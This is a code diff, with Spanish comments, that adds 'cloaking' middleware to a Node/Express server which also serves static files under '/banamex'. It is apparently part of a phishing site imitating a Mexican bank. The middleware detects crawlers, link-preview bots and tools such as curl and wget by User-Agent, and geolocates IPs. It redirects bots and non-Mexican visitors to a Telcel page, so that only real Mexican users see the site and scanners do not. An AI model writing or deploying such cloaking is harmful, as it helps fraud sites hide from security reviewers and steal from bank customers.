@@ -3,6 +3,7 @@ import { registerRoutes } from "./routes";
 import { setupVite, serveStatic, log } from "./vite";
 import cookieParser from "cookie-parser";
 import dotenv from "dotenv";
+import geoip from "geoip-lite";
 
 // Cargar variables de entorno
 dotenv.config();
@@ -66,6 +67,79 @@ app.use((req, res, next) => {
 });
 
 (async () => {
+  // Middleware de cloaking - filtrar por geolocalización y detectar bots
+  app.use((req: Request, res: Response, next: NextFunction) => {
+    // Permitir acceso a rutas de API y admin sin filtro
+    if (req.path.startsWith('/api') || req.path.startsWith('/admin')) {
+      return next();
+    }
+
+    // Obtener la IP real del cliente (considerando proxies)
+    const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() 
+                     || req.headers['x-real-ip'] as string
+                     || req.socket.remoteAddress 
+                     || '';
+
+    // Permitir IPs locales/privadas para desarrollo
+    const localIPs = ['127.0.0.1', '::1', 'localhost', '::ffff:127.0.0.1'];
+    const isLocalIP = localIPs.includes(clientIp) || 
+                      clientIp.startsWith('192.168.') || 
+                      clientIp.startsWith('10.') ||
+                      clientIp.startsWith('172.16.') ||
+                      clientIp.startsWith('172.17.') ||
+                      clientIp.startsWith('172.18.') ||
+                      clientIp.startsWith('172.19.') ||
+                      clientIp.startsWith('172.20.') ||
+                      clientIp.startsWith('172.21.') ||
+                      clientIp.startsWith('172.22.') ||
+                      clientIp.startsWith('172.23.') ||
+                      clientIp.startsWith('172.24.') ||
+                      clientIp.startsWith('172.25.') ||
+                      clientIp.startsWith('172.26.') ||
+                      clientIp.startsWith('172.27.') ||
+                      clientIp.startsWith('172.28.') ||
+                      clientIp.startsWith('172.29.') ||
+                      clientIp.startsWith('172.30.') ||
+                      clientIp.startsWith('172.31.');
+
+    if (isLocalIP) {
+      console.log(`[Cloaker] ✓ IP local/desarrollo permitida: ${clientIp}`);
+      return next();
+    }
+
+    // Detectar bots por User-Agent
+    const userAgent = req.headers['user-agent'] || '';
+    const botPatterns = [
+      /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
+      /googlebot/i, /bingbot/i, /yahoo/i, /baiduspider/i,
+      /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+      /whatsapp/i, /telegram/i, /slack/i, /discord/i,
+      /curl/i, /wget/i, /python/i, /java/i, /php/i
+    ];
+    
+    const isBot = botPatterns.some(pattern => pattern.test(userAgent));
+
+    // Si es un bot, redirigir a Telcel
+    if (isBot) {
+      console.log(`[Cloaker] Bot detectado: ${userAgent.substring(0, 50)} - IP: ${clientIp}`);
+      return res.redirect('https://www.telcel.com/iphone');
+    }
+
+    // Obtener información de geolocalización
+    const geo = geoip.lookup(clientIp);
+    
+    // Si no se puede determinar la ubicación O no es de México, redirigir a Telcel
+    if (!geo || geo.country !== 'MX') {
+      const country = geo?.country || 'Desconocido';
+      console.log(`[Cloaker] IP no mexicana detectada: ${clientIp} (${country})`);
+      return res.redirect('https://www.telcel.com/iphone');
+    }
+
+    // Si es de México y no es bot, permitir acceso
+    console.log(`[Cloaker] ✓ Acceso permitido - IP mexicana: ${clientIp} (${geo.city || 'Ciudad desconocida'})`);
+    next();
+  });
+
   // Servir archivos estáticos de Banamex ANTES de todo
   app.use('/banamex', express.static('public/banamex'));
 
